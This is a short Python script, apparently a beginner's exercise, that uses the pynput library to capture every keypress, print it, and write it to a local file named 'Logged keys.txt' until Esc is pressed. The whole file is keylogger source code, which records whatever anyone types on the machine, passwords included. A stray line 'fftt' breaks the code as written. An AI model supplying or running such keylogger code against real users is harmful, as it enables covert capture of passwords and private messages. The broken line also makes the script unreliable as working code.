import pynput
from pynput.keyboard import Key, Listener

write_file = open("Logged keys.txt ", "w")
write_file.write("Key Logger is working :) \n\n")

fftt


def on_press(key):
    print("{}pressed".format(key))


    write_file.write(str(key))

    #def on_release(key):
        #if key == Key.esc:
          #  return False


def on_release(key):
    if key == Key.esc:
        return False



with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()



write_file.close()




